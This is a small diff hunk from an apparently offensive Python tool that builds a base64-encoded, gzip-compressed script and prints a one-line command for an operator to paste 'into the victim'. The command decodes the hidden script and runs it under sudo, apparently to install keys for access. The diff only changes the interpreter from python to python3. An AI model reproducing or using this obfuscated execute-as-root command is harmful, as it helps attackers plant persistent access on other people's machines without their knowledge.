@@ -88,7 +88,7 @@ def main():
 
     SCRIPT = templify(SCRIPT_TEMPLATE, replacements)
     gzbased = gzbase(SCRIPT)
-    cmd = "echo %s | base64 -d | gzip -d | sudo python" % gzbased.decode("ascii")
+    cmd = "echo %s | base64 -d | gzip -d | sudo python3" % gzbased.decode("ascii")
     print("[+] paste the following into the victim as the user to install the keys to")
     print(cmd)
     f = tempfile.NamedTemporaryFile(delete=False)
